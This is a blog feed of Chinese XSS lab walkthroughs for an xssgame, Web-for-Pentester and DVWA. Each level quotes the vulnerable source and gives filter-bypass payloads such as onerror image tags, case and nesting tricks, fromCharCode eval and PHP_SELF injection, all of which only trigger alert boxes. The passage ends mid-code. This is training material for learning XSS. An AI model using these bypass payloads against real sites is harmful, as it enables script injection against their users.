class="headerlink" title="查看源码:"></a>查看源码:</h3><pre><code>&lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;script&gt;window.alert = function()  {     confirm(&quot;ORZ ORZ ORZ 恭喜全部通过&quot;); window.location.href=&quot;success.txt&quot;; }&lt;/script&gt;&lt;title&gt;第15关&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;第15关 厉害了 Word哥&lt;/h1&gt;&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot;    &quot;,&quot;&amp;nbsp;&quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;?&gt;&lt;center&gt;&lt;img src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/9ec67d16-a8b9-41cd-82fa-14b0c0f96e72.gif&quot;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析:"></a>分析:</h3><p>get传入可以word，转换为小写，让过滤script，空格，/，可以使用url编码来绕过<br>| 符号 |url编码 |<br>| ——– | —— |<br>| 回车     | %0d |<br>| 换行     | %0d |<br>payload:</p><pre><code>level15.php?keyword=&lt;img%0asrc=x%0aonerror=alert(&#39;XSS&#39;)&gt;</code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>国光大佬:<a href="https://www.sqlsec.com/2020/01/xss.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/01/xss.html</a><br>最后欢迎访问我的博客:<a href="https://lmg66.github.io/">https://lmg66.github.io/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;配置&quot;&gt;&lt;a href=&quot;#配置&quot; class=&quot;headerlink&quot; title=&quot;配置&quot;&gt;&lt;/a&gt;配置&lt;/h2&gt;&lt;p&gt;下载地址:&lt;a href=&quot;https://files.cnblogs.com/files/Lmg66/xssgame-master.zip
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://lnng.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="https://lnng.top/tags/xss/"/>
    
      <category term="靶场" scheme="https://lnng.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Web-for-Pentester靶场-xss部分</title>
    <link href="https://lnng.top/posts/fb02.html"/>
    <id>https://lnng.top/posts/fb02.html</id>
    <published>2020-07-15T11:12:18.000Z</published>
    <updated>2020-07-16T04:33:31.547Z</updated>
    
    <content type="html"><![CDATA[<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>官网:<a href="https://pentesterlab.com/" target="_blank" rel="noopener">https://pentesterlab.com/</a><br>下载地址:<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso" target="_blank" rel="noopener">https://isos.pentesterlab.com/web_for_pentester_i386.iso</a><br>安装方法:虚拟机按照，该靶场是封装在debian系统里，安装完成打开，ifconfig查看ip地址：<br><img src="https://Lmg66.github.io/img/75.png" alt="图片"><br><img src="https://Lmg66.github.io/img/76.png" alt="图片"><br>然后直接访问ip即可<br>web for pentester默认没有root密码，可以来设置密码，方便ssh连接等查看源码</p><pre><code>sudo passwd</code></pre><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><h4 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php        echo $_GET[&quot;name&quot;];?&gt;</code></pre><h4 id="分析"><a href="#分析" class="headerlink" title="分析:"></a>分析:</h4><p>没有任何的过滤，直接将get获取的打印</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><p>/xss/example1.php?name=<script>alert('xss')</script><br><img src="https://Lmg66.github.io/img/77.png" alt="图片"></p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><h4 id="查看源码-1"><a href="#查看源码-1" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php        $name =  $_GET[&quot;name&quot;];        $name = preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;, $name);        $name = preg_replace(&quot;/&lt;\/script&gt;/&quot;,&quot;&quot;, $name);echo $name;?&gt;</code></pre><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析:"></a>分析:</h4><p>这里通过preg_replace()函数来正则<script> </script>,但是这种匹配是有缺陷的，没有匹配大小写，可以通过大小写绕过<br><img src="https://Lmg66.github.io/img/78.png" alt="图片"></p><h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example2.php?name=&lt;Script&gt;alert(&#39;xss&#39;)&lt;/Script&gt;</code></pre><p><img src="https://Lmg66.github.io/img/79.png" alt="图片"></p><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><h4 id="查看源码-2"><a href="#查看源码-2" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php        $name =  $_GET[&quot;name&quot;];        $name = preg_replace(&quot;/&lt;script&gt;/i&quot;,&quot;&quot;, $name);        $name = preg_replace(&quot;/&lt;\/script&gt;/i&quot;,&quot;&quot;, $name);echo $name;?&gt;</code></pre><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析:"></a>分析:</h4><p>在第二关的基础上加了/i，使之匹配不区分大小写，preg_replace()函数将匹配到的，替换成空格，但是只匹配了一次，类似sql注入(Seselectlect)，可以嵌套&lt;sc<script>ript> </sc</script>ript&gt;，匹配到了，替换成空格变成我们想要的了</p><h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example3.php?name=&lt;sc&lt;script&gt;ript&gt;alert(&#39;xss&#39;)&lt;/sc&lt;/script&gt;ript&gt;</code></pre><p><img src="https://Lmg66.github.io/img/80.png" alt="图片"></p><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><h4 id="查看源码-3"><a href="#查看源码-3" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php require_once &#39;../header.php&#39;;if (preg_match(&#39;/script/i&#39;, $_GET[&quot;name&quot;])) {  die(&quot;error&quot;);}?&gt;Hello &lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;</code></pre><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析:"></a>分析:</h4><p>对script进行了不区分大小写，匹配如果匹配到，就执行die(“error”),终止程序，所以scirpt不能用，只能通过其他标签来触发js事件，可使用onerror事件，来执行js<br><img src="https://Lmg66.github.io/img/81.png" alt="图片"><br><img src="https://Lmg66.github.io/img/82.png" alt="图片"></p><h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example4.php?name=&lt;img src=&quot;xss&quot; onerror=alert(&#39;xss&#39;)&gt;</code></pre><p><img src="https://Lmg66.github.io/img/83.png" alt="图片"></p><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><h4 id="查看源码-4"><a href="#查看源码-4" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php require_once &#39;../header.php&#39;;if (preg_match(&#39;/alert/i&#39;, $_GET[&quot;name&quot;])) {  die(&quot;error&quot;);}?&gt;Hello &lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;</code></pre><h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析:"></a>分析:</h4><p>对alert进行了过滤</p><h5 id="一-可以使用类似alert的方法来弹窗比如confirm，prompt"><a href="#一-可以使用类似alert的方法来弹窗比如confirm，prompt" class="headerlink" title="一.可以使用类似alert的方法来弹窗比如confirm，prompt"></a>一.可以使用类似alert的方法来弹窗比如confirm，prompt</h5><p><img src="https://Lmg66.github.io/img/84.png" alt="图片"><br><img src="https://Lmg66.github.io/img/85.png" alt="图片"></p><h5 id="二-通过编码绕过，String-fromCharCode-编码来绕过，可以使用hackbar来快速编码"><a href="#二-通过编码绕过，String-fromCharCode-编码来绕过，可以使用hackbar来快速编码" class="headerlink" title="二.通过编码绕过，String.fromCharCode()编码来绕过，可以使用hackbar来快速编码"></a>二.通过编码绕过，String.fromCharCode()编码来绕过，可以使用hackbar来快速编码</h5><p><img src="https://Lmg66.github.io/img/86.png" alt="图片"><br><img src="https://Lmg66.github.io/img/87.png" alt="图片"><br><img src="https://Lmg66.github.io/img/88.png" alt="图片"><br><img src="https://Lmg66.github.io/img/89.png" alt="图片"></p><h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example5.php?name=&lt;script&gt;confirm(&#39;xss&#39;)&lt;/script&gt;/xss/example5.php?name=&lt;script&gt;prompt(&#39;xss&#39;)&lt;/script&gt;/xss/example5.php?name=&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 120, 115, 115, 39, 41))&lt;/script&gt;</code></pre><p><img src="https://Lmg66.github.io/img/90.png" alt="图片"><br><img src="https://Lmg66.github.io/img/91.png" alt="图片"><br><img src="https://Lmg66.github.io/img/92.png" alt="图片"></p><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><h4 id="查看源码-5"><a href="#查看源码-5" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;script&gt;        var $a= &quot;&lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;&quot;;&lt;/script&gt;</code></pre><h4 id="分析-5"><a href="#分析-5" class="headerlink" title="分析:"></a>分析:</h4><p>通过get的方式传入name变量，输入赋值给全局变量a，可以通过闭合双引号或者注释双引号来增加我们的js代码</p><h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example6.php?name=&quot;;alert(&#39;xss&#39;);&quot;/xss/example6.php?name=&quot;;alert(&#39;xss&#39;);//</code></pre><p><img src="https://Lmg66.github.io/img/93.png" alt="图片"><br><img src="https://Lmg66.github.io/img/94.png" alt="图片"><br><img src="https://Lmg66.github.io/img/95.png" alt="图片"><br><img src="https://Lmg66.github.io/img/96.png" alt="图片"></p><h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><h4 id="查看源码-6"><a href="#查看源码-6" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;script&gt;        var $a= &#39;&lt;?php  echo htmlentities($_GET[&quot;name&quot;]); ?&gt;&#39;;&lt;/script&gt;</code></pre><h4 id="分析-6"><a href="#分析-6" class="headerlink" title="分析:"></a>分析:</h4><p>和第八关相似htmlentities()会把字符转换为HTML实体，会将双引号进行编码，但不编码单引号，这里使用的是单引好所以可以继续包含和注释</p><h4 id="payload-6"><a href="#payload-6" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example7.php?name=&#39;;alert(&#39;xss&#39;);&#39;/xss/example7.php?name=&#39;;alert(&#39;xss&#39;);//</code></pre><p><img src="https://Lmg66.github.io/img/97.png" alt="图片"><br><img src="https://Lmg66.github.io/img/98.png" alt="图片"><br><img src="https://Lmg66.github.io/img/99.png" alt="图片"><br><img src="https://Lmg66.github.io/img/100.png" alt="图片"></p><h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><h4 id="查看源码-7"><a href="#查看源码-7" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;?php  require_once &#39;../header.php&#39;;if (isset($_POST[&quot;name&quot;])) {    echo &quot;HELLO &quot;.htmlentities($_POST[&quot;name&quot;]);  }?&gt;&lt;form action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]; ?&gt;&quot; method=&quot;POST&quot;&gt;Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</code></pre><h4 id="分析-7"><a href="#分析-7" class="headerlink" title="分析:"></a>分析:</h4><p>name变量通过form表单以post方式传入，然后通过htmlentities函数实体化后输出来，并未找到破解的方法。然后观察<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">，用户可控制参数PHP_SELF，并且没有闭合引号和标签</p><h4 id="payload-7"><a href="#payload-7" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example8.php/&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;///xss/example8.php/&quot; onclick=alert(&#39;XSS&#39;)//</code></pre><p><img src="https://Lmg66.github.io/img/101.png" alt="图片"><br><img src="https://Lmg66.github.io/img/102.png" alt="图片"><br><img src="https://Lmg66.github.io/img/103.png" alt="图片"></p><h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><h4 id="查看源码-8"><a href="#查看源码-8" class="headerlink" title="查看源码:"></a>查看源码:</h4><pre><code>&lt;script&gt;  document.write(location.hash.substring(1));&lt;/script&gt;</code></pre><h4 id="分析-8"><a href="#分析-8" class="headerlink" title="分析:"></a>分析:</h4><p>location.hash属性<br><img src="https://Lmg66.github.io/img/104.png" alt="图片"></p><h4 id="payload-8"><a href="#payload-8" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example9.php#&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code></pre><p>注意：在火狐和Chrome浏览器&lt;&gt;会被自动转码</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.sqlsec.com/2020/05/pentesterlab.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/05/pentesterlab.html</a><br><a href="https://blog.csdn.net/qq_20307987/article/details/51284169" target="_blank" rel="noopener">https://blog.csdn.net/qq_20307987/article/details/51284169</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;配置&quot;&gt;&lt;a href=&quot;#配置&quot; class=&quot;headerlink&quot; title=&quot;配置&quot;&gt;&lt;/a&gt;配置&lt;/h3&gt;&lt;p&gt;官网:&lt;a href=&quot;https://pentesterlab.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://lnng.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="https://lnng.top/tags/xss/"/>
    
      <category term="靶场" scheme="https://lnng.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>DVWA靶场-xss部分源码分析</title>
    <link href="https://lnng.top/posts/b063.html"/>
    <id>https://lnng.top/posts/b063.html</id>
    <published>2020-07-15T11:03:31.000Z</published>
    <updated>2020-07-16T05:36:41.603Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>DVWA靶场都不陌生，最新学习xss，从新又搞了一遍xss部分，从源码方面康康xss的原因，参考了很多大佬的博客表示感谢</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>官网:<a href="">http://www.dvwa.co.uk/</a><br>下载地址:<a href="">https://github.com/ethicalhack3r/DVWA</a><br>下载方式:zip下载或git <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a><br>下载完成放入http服务下即可<br>我使用的是phpstudy下载地址:<a href="https://m.xp.cn/" target="_blank" rel="noopener">https://m.xp.cn/</a></p><h3 id="反射性xss"><a href="#反射性xss" class="headerlink" title="反射性xss"></a>反射性xss</h3><h4 id="级别low"><a href="#级别low" class="headerlink" title="级别low"></a>级别low</h4><h5 id="查看源码"><a href="#查看源码" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Feedback for end user    $html .= &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;;}?&gt;</code></pre><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>name变量没有过滤，直接输出</p><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p><code>/vulnerabilities/xss_r/?name=&lt;script&gt;alert(&#39;xss&#39;)&lt;%2Fscript&gt;#</code></p><p><img src="https://Lmg66.github.io/img/105.png" alt="图片"></p><h4 id="级别-Medium"><a href="#级别-Medium" class="headerlink" title="级别:Medium"></a>级别:Medium</h4><h5 id="查看源码-1"><a href="#查看源码-1" class="headerlink" title="查看源码"></a>查看源码</h5><pre><code>&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Get input    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );    // Feedback for end user    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}?&gt;</code></pre><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>这里用正则表达过滤&lt;scr/ipt&gt;标签,正则的匹配有缺陷大小问题，而且只是匹配了一次可以嵌套，而且只是过滤&lt;scr/ipt&gt;还可以用其他标签代替来触发反射性xss</p><h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><pre><code>vulnerabilities/xss_r/?name=&lt;Script&gt;alert(&#39;xss&#39;)&lt;%2FScript&gt;#vulnerabilities/xss_r/?name=&lt;img+src%3Dx+onerror%3Dalert(&#39;XSS&#39;)&gt;#/vulnerabilities/xss_r/?name=&lt;s&lt;script&gt;cript&gt;alert(&#39;XSS&#39;)&lt;%2Fscript&gt;#</code></pre><p><img src="https://Lmg66.github.io/img/106.png" alt="图片"><br><img src="https://Lmg66.github.io/img/107.png" alt="图片"><br><img src="https://Lmg66.github.io/img/108.png" alt="图片"></p><h4 id="级别-high"><a href="#级别-high" class="headerlink" title="级别:high"></a>级别:high</h4><h5 id="查看源码-2"><a href="#查看源码-2" class="headerlink" title="查看源码"></a>查看源码</h5><pre><code>&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Get input    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );    // Feedback for end user    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}?&gt;</code></pre><h5 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h5><p>不区分大小写，而且通配符匹配，嵌套无法使用，可以尝试其他标签触发弹窗</p><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><p><code>/vulnerabilities/xss_r/?name=&lt;img+src%3D&quot;xss&quot;+onerror%3Dalert(&#39;xss&#39;)&gt;#</code></p><h4 id="级别-impossible"><a href="#级别-impossible" class="headerlink" title="级别:impossible"></a>级别:impossible</h4><h5 id="查看源码-3"><a href="#查看源码-3" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $name = htmlspecialchars( $_GET[ &#39;name&#39; ] );    // Feedback for end user    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><h5 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h5><p>name变量通过htmlspecialchars()函数把预定的字符转为HTML实体，且输入到pre标签里，所以占时<br><img src="https://Lmg66.github.io/img/109.png" alt="图片"><br><img src="https://Lmg66.github.io/img/110.png" alt="图片"></p><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><h4 id="级别-low"><a href="#级别-low" class="headerlink" title="级别:low"></a>级别:low</h4><h5 id="查看源码-4"><a href="#查看源码-4" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;div class=&quot;vulnerable_code_area&quot;&gt;&lt;p&gt;Please choose a language:&lt;/p&gt;&lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt;            &lt;select name=&quot;default&quot;&gt;                &lt;script&gt;                    if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) {                        var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);                        document.write(&quot;&lt;option value=&#39;&quot; + lang + &quot;&#39;&gt;&quot; + $decodeURI(lang) + &quot;&lt;/option&gt;&quot;);                        document.write(&quot;&lt;option value=&#39;&#39; disabled=&#39;disabled&#39;&gt;----&lt;/option&gt;&quot;);                    }                    document.write(&quot;&lt;option value=&#39;English&#39;&gt;English&lt;/option&gt;&quot;);                    document.write(&quot;&lt;option value=&#39;French&#39;&gt;French&lt;/option&gt;&quot;);                    document.write(&quot;&lt;option value=&#39;Spanish&#39;&gt;Spanish&lt;/option&gt;&quot;);                    document.write(&quot;&lt;option value=&#39;German&#39;&gt;German&lt;/option&gt;&quot;);                &lt;/script&gt;            &lt;/select&gt;            &lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt;        &lt;/form&gt;&lt;/div&gt;</code></pre><h5 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h5><p>lang变量通过document.location.href来获取url，并没有过滤就输入到了option标签中<br><img src="https://Lmg66.github.io/img/111.png" alt="图片"><br><img src="https://Lmg66.github.io/img/112.png" alt="图片"></p><h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h5><p><img src="https://Lmg66.github.io/img/113.png" alt="图片"></p><h4 id="级别-Medium-1"><a href="#级别-Medium-1" class="headerlink" title="级别:Medium"></a>级别:Medium</h4><h5 id="查看源码-5"><a href="#查看源码-5" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {    $default = $_GET[&#39;default&#39;];    # Do not allow script tags    if (stripos ($default, &quot;&lt;script&quot;) !== false) {        header (&quot;location: ?default=English&quot;);        exit;    }}?&gt;</code></pre><h5 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h5><p>对default变量进行了过滤，通过stripos()函数查找&lt;scr/ipt&gt;在default中的位置(不区分大小写)，如果匹配到，则变为default=English,但是可以使用其他标签来绕过，先要闭合</option>和</select>标签<br><img src="https://Lmg66.github.io/img/114.png" alt="图片"><br><img src="https://Lmg66.github.io/img/115.png" alt="图片"></p><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h5><pre><code>/vulnerabilities/xss_d/?default=English &lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;/vulnerabilities/xss_d/?default=English&lt;input onclick=alert(&#39;XSS&#39;) /&gt;</code></pre><p><img src="https://Lmg66.github.io/img/116.png" alt="图片"><br><img src="https://Lmg66.github.io/img/117.png" alt="图片"></p><h4 id="级别-high-1"><a href="#级别-high-1" class="headerlink" title="级别:high"></a>级别:high</h4><h5 id="查看源码-6"><a href="#查看源码-6" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {    # White list the allowable languages    switch ($_GET[&#39;default&#39;]) {        case &quot;French&quot;:        case &quot;English&quot;:        case &quot;German&quot;:        case &quot;Spanish&quot;:            # ok            break;        default:            header (&quot;location: ?default=English&quot;);            exit;    }}?&gt;</code></pre><h5 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h5><p>使用白名单，进行匹配，如果值不为就default=English，但是只是对default进行了过滤，可以使用其他变量，document.location.href来获取url，仍然会输出到标签中显示，当然也可以用注释符号#</p><h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h5><pre><code>/vulnerabilities/xss_d/?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;/vulnerabilities/xss_d/?default=English&amp;a=?default=English&amp;a=&lt;input onclick=alert(&#39;XSS&#39;) /&gt;/vulnerabilities/xss_d/?default=English#&lt;input onclick=alert(&#39;XSS&#39;) /&gt;/vulnerabilities/xss_d/?default=English#&lt;/option&gt;&lt;/select&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;)</code></pre><p><img src="https://Lmg66.github.io/img/118.png" alt="图片"><br><img src="https://Lmg66.github.io/img/119.png" alt="图片"><br><img src="https://Lmg66.github.io/img/120.png" alt="图片"><br><img src="https://Lmg66.github.io/img/121.png" alt="图片"></p><h4 id="级别-impossible-1"><a href="#级别-impossible-1" class="headerlink" title="级别:impossible"></a>级别:impossible</h4><h5 id="查看源码-7"><a href="#查看源码-7" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code># For the impossible level, don&#39;t decode the querystring$decodeURI = &quot;decodeURI&quot;;if ($vulnerabilityFile == &#39;impossible.php&#39;) {    $decodeURI = &quot;&quot;;}</code></pre><h5 id="分析-7"><a href="#分析-7" class="headerlink" title="分析:"></a>分析:</h5><p>如果是impossible难度则decodeURI=””，意思就是不解码，那么标签就会被过滤，无法闭合标签和创建新标签，所以无法xss<br><img src="https://Lmg66.github.io/img/122.png" alt="图片"></p><h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><h4 id="级别-low-1"><a href="#级别-low-1" class="headerlink" title="级别:low"></a>级别:low</h4><h5 id="查看源码-8"><a href="#查看源码-8" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Sanitize name input    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><h5 id="分析-trim-函数-stripslashes-函数-mysqli-real-escape-string-函数只是对-类型的处理过滤转码，主要是对数据库的保护并未设计的xss的内容，故可以直接xss"><a href="#分析-trim-函数-stripslashes-函数-mysqli-real-escape-string-函数只是对-类型的处理过滤转码，主要是对数据库的保护并未设计的xss的内容，故可以直接xss" class="headerlink" title="分析:trim()函数 stripslashes() 函数 mysqli_real_escape_string() 函数只是对/类型的处理过滤转码，主要是对数据库的保护并未设计的xss的内容，故可以直接xss"></a>分析:trim()函数 stripslashes() 函数 mysqli_real_escape_string() 函数只是对/类型的处理过滤转码，主要是对数据库的保护并未设计的xss的内容，故可以直接xss</h5><p><img src="https://Lmg66.github.io/img/123.png" alt="图片"><br><img src="https://Lmg66.github.io/img/124.png" alt="图片"><br><img src="https://Lmg66.github.io/img/125.png" alt="图片"></p><h5 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h5><pre><code>name:Lmg66message:&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></pre><p><img src="https://Lmg66.github.io/img/126.png" alt="图片"></p><h4 id="级别-medium"><a href="#级别-medium" class="headerlink" title="级别:medium"></a>级别:medium</h4><h5 id="查看源码-9"><a href="#查看源码-9" class="headerlink" title="查看源码:"></a>查看源码:</h5><pre><code>&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = strip_tags( addslashes( $message ) );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; 